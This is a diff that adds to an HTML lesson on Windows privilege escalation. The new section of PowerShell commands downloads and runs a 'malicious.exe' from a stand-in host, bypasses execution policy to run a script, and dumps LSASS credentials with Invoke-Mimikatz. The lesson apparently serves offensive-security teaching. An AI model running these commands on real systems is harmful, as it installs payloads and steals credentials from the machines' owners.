@@ -12,11 +12,30 @@
     
     <div class="lesson">
       <h2>Windows Privilege Escalation</h2>
+      
       <h3>PowerShell Commands</h3>
       <pre><code>
 Get-Process -IncludeUserName
 Get-WmiObject Win32_ComputerSystem
 (Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True").Name
+Get-Service -Name '*' | Where-Object { $_.Status -eq 'Stopped' }
+      </code></pre>
+      
+      <h3>Advanced PowerShell Techniques</h3>
+      <pre><code>
+# Download and execute a remote payload
+Invoke-WebRequest -Uri 'http://example.com/malicious.exe' -OutFile 'C:\Temp\malicious.exe'
+Start-Process 'C:\Temp\malicious.exe'
+
+# Bypass Execution Policy and run a script
+Set-ExecutionPolicy Bypass -Scope CurrentUser
+. .\malicious.ps1
+
+# List all ACLs for files and folders
+Get-ChildItem -Recurse | Get-Acl
+
+# Dump LSASS process memory for credential extraction
+Invoke-Mimikatz -DumpCreds
       </code></pre>
       
       <h3>DLL Hijacking</h3>
